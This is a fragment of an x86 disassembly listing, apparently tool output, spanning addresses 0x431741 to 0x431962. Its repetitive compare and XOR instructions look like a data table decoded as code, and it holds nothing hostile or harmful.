  431741:	cmp    dl,bl
  431743:	cmp    BYTE PTR [edi],cl
  431745:	cmp    DWORD PTR [eax],ebp
  431747:	cmp    DWORD PTR [edi],ebp
  431749:	cmp    DWORD PTR [edi],esi
  43174b:	cmp    DWORD PTR [ecx+edi*1],edi
  43174e:	inc    eax
  43174f:	cmp    DWORD PTR [ecx+edi*1+0x6d],eax
  431753:	cmp    DWORD PTR [ebx-0x47c64ec7],edx
  431759:	cmp    DWORD PTR [ecx+edi*1+0x39c439c0],edi
  431760:	enter  0xcc39,0x39
  431764:	sar    BYTE PTR [ecx],1
  431766:	aam    0x39
  431768:	push   ds
  431769:	cmp    ah,BYTE PTR [edx+edi*1]
  43176c:	sub    BYTE PTR [edx],bh
  43176e:	sub    al,0x3a
  431770:	xor    BYTE PTR [edx],bh
  431772:	xchg   esi,eax
  431773:	cmp    ah,BYTE PTR [ecx-0x3cc543c6]
  431779:	cmp    cl,al
  43177b:	cmp    cl,ah
  43177d:	cmp    dl,al
  43177f:	cmp    dh,cl
  431781:	cmp    bl,BYTE PTR [ebx]
  431783:	cmp    ecx,DWORD PTR [ebp+0x3b]
  431786:	push   esp
  431787:	cmp    ebx,DWORD PTR [eax+0x3b]
  43178a:	pop    esp
  43178b:	cmp    esp,DWORD PTR [eax+0x3b]
  43178e:	cmp    ebp,DWORD PTR fs:[eax+0x3b]
  431792:	ins    BYTE PTR es:[edi],dx
  431793:	cmp    esi,DWORD PTR [eax+0x3b]
  431796:	mov    edx,0xc43bc03b
  43179b:	cmp    ecx,eax
  43179d:	cmp    ecx,esp
  43179f:	cmp    eax,DWORD PTR [eax+0x3c]
  4317a2:	push   esi
  4317a3:	cmp    al,0x8e
  4317a5:	cmp    al,0xd1
  4317a7:	cmp    al,0xd7
  4317a9:	cmp    al,0x2
  4317ab:	cmp    eax,0x3d303d0d
  4317b0:	hlt    
  4317b1:	cmp    eax,0x3f843e01
  4317b6:	jmp    0x830cfa
  4317bb:	add    BYTE PTR [eax],al
  4317bd:	mov    al,ds:0x480000
  4317c2:	add    BYTE PTR [eax],al
  4317c4:	ins    DWORD PTR es:[edi],dx
  4317c5:	xor    BYTE PTR [edi-0x41cf6fd0],al
  4317cb:	xor    ah,al
  4317cd:	xor    cl,cl
  4317cf:	xor    bh,cl
  4317d1:	xor    dh,dl
  4317d3:	xor    al,ch
  4317d5:	xor    BYTE PTR [ebp+0x31],dh
  4317d8:	icebp  
  4317d9:	xor    DWORD PTR ds:0x7c324532,ebx
  4317df:	xor    al,BYTE PTR [esi-0xacd27ce]
  4317e5:	xor    ah,BYTE PTR [ecx]
  4317e7:	xor    ebx,DWORD PTR [edx+0x33]
  4317ea:	xor    eax,DWORD PTR [bp+0x34]
  4317ee:	push   ebp
  4317ef:	xor    al,0x54
  4317f1:	aaa    
  4317f2:	pop    ebx
  4317f3:	aaa    
  4317f4:	cmp    edi,DWORD PTR [eax]
  4317f6:	js     0x431830
  4317f8:	cmp    BYTE PTR [eax],0x9a
  4317fb:	cmp    bl,al
  4317fd:	cmp    bh,dh
  4317ff:	cmp    BYTE PTR [esi],ah
  431801:	cmp    DWORD PTR [eax+0x3b],eax
  431804:	add    BYTE PTR [eax+0x1c0000],dh
  43180a:	add    BYTE PTR [eax],al
  43180c:	in     al,dx
  43180d:	xor    eax,esi
  43180f:	xor    esp,esi
  431811:	xor    eax,edi
  431813:	xor    esp,edi
  431815:	xor    DWORD PTR [eax],ecx
  431817:	xor    cl,BYTE PTR [edx+esi*1]
  43181a:	test   BYTE PTR [edx],dh
  43181c:	mov    BYTE PTR [edx],dh
  43181e:	add    BYTE PTR [eax],al
  431820:	add    al,al
  431822:	add    BYTE PTR [eax],al
  431824:	pop    esp
  431825:	add    BYTE PTR [eax],al
  431827:	add    BYTE PTR [esi+esi*1+0x373436a8],ah
  43182e:	cmp    BYTE PTR [edi],dh
  431830:	inc    eax
  431831:	aaa    
  431832:	inc    esp
  431833:	aaa    
  431834:	pusha  
  431835:	aaa    
  431836:	xor    BYTE PTR [edi],0x9c
  431839:	aaa    
  43183a:	mov    al,ds:0xcc37c037
  43183f:	aaa    
  431840:	call   0x107b0c7c
  431845:	cmp    BYTE PTR [eax],dh
  431847:	cmp    BYTE PTR [eax+0x38],dl
  43184a:	jo     0x431884
  43184c:	nop
  43184d:	cmp    BYTE PTR [eax-0xfc72fc8],dh
  431853:	cmp    BYTE PTR [eax],dl
  431855:	cmp    DWORD PTR [ecx+edi*1],ebp
  431858:	xor    BYTE PTR [ecx],bh
  43185a:	push   eax
  43185b:	cmp    DWORD PTR [ecx+edi*1+0x70],ebp
  43185f:	cmp    DWORD PTR [eax-0x4fc653c7],edx
  431865:	cmp    eax,edx
  431867:	cmp    eax,esi
  431869:	cmp    DWORD PTR [eax],edx
  43186b:	cmp    bl,BYTE PTR [edx+edi*1]
  43186e:	xor    al,0x3a
  431870:	cmp    BYTE PTR [edx],bh
  431872:	pop    eax
  431873:	cmp    bh,BYTE PTR [eax+0x3a]
  431876:	cwde   
  431877:	cmp    bh,BYTE PTR [eax+0x3a]
  43187d:	loopne 0x43187f
  43187f:	add    al,ch
  431881:	add    BYTE PTR [eax],al
  431883:	add    BYTE PTR [eax-0x6bce73cf],al
  431889:	xor    DWORD PTR [ecx+esi*1+0x31ac31a4],ebx
  431890:	mov    ah,0x31
  431892:	mov    esp,0xcc31c431
  431897:	xor    esp,edx
  431899:	xor    esp,ebx
  43189b:	xor    esp,esp
  43189d:	xor    esp,ebp
  43189f:	xor    esp,esi
  4318a1:	xor    esp,edi
  4318a3:	xor    DWORD PTR [edx+esi*1],eax
  4318a6:	or     al,0x32
  4318a8:	adc    al,0x32
  4318aa:	sbb    al,0x32
  4318ac:	and    al,0x32
  4318ae:	sub    al,0x32
  4318b0:	xor    al,0x32
  4318b2:	cmp    al,0x32
  4318b4:	mov    al,ds:0x4832a832
  4318b9:	cmp    DWORD PTR [eax+0x3a],eax
  4318bc:	test   al,0x3a
  4318be:	mov    eax,0xd83ac83a
  4318c3:	cmp    ch,al
  4318c5:	cmp    cl,BYTE PTR [ebx+edi*1]
  4318c8:	sbb    BYTE PTR [ebx],bh
  4318ca:	sbb    al,0x3b
  4318cc:	and    BYTE PTR [ebx],bh
  4318ce:	and    al,0x3b
  4318d0:	sub    BYTE PTR [ebx],bh
  4318d2:	xor    BYTE PTR [ebx],bh
  4318d4:	xor    al,0x3b
  4318d6:	cmp    BYTE PTR [ebx],bh
  4318d8:	cmp    al,0x3b
  4318da:	inc    eax
  4318db:	cmp    eax,DWORD PTR [ebx+edi*1+0x48]
  4318df:	cmp    ecx,DWORD PTR [ebx+edi*1+0x50]
  4318e3:	cmp    edx,DWORD PTR [ebx+edi*1+0x58]
  4318e7:	cmp    ebx,DWORD PTR [ebx+edi*1+0x60]
  4318eb:	cmp    esp,DWORD PTR [ebx+edi*1-0x60]
  4318ef:	cmp    al,0xa4
  4318f1:	cmp    al,0xa8
  4318f3:	cmp    al,0xac
  4318f5:	cmp    al,0xb0
  4318f7:	cmp    al,0xb4
  4318f9:	cmp    al,0xb8
  4318fb:	cmp    al,0xbc
  4318fd:	cmp    al,0xc0
  4318ff:	cmp    al,0xc4
  431901:	cmp    al,0xc8
  431903:	cmp    al,0xcc
  431905:	cmp    al,0xd0
  431907:	cmp    al,0xd4
  431909:	cmp    al,0xd8
  43190b:	cmp    al,0xdc
  43190d:	cmp    al,0xe0
  43190f:	cmp    al,0xe4
  431911:	cmp    al,0xe8
  431913:	cmp    al,0xec
  431915:	cmp    al,0xf0
  431917:	cmp    al,0xf4
  431919:	cmp    al,0xf8
  43191b:	cmp    al,0xfc
  43191d:	cmp    al,0x0
  43191f:	cmp    eax,0x3d083d04
  431924:	or     al,0x3d
  431926:	adc    BYTE PTR ds:0x3d183d14,bh
  43192c:	sbb    al,0x3d
  43192e:	and    BYTE PTR ds:0x3d283d24,bh
  431934:	sub    al,0x3d
  431936:	xor    BYTE PTR ds:0x3d383d34,bh
  43193c:	cmp    al,0x3d
  43193e:	inc    eax
  43193f:	cmp    eax,0x3d483d44
  431944:	dec    esp
  431945:	cmp    eax,0x3d603d50
  43194a:	push   0x703d6c3d
  43194f:	cmp    eax,0x3d783d74
  431954:	jl     0x431993
  431956:	cmp    BYTE PTR ds:0x3d883d84,0x8c
  43195d:	cmp    eax,0x3e603d98
  431962:	fs add BYTE PTR ds:[eax],al
	...
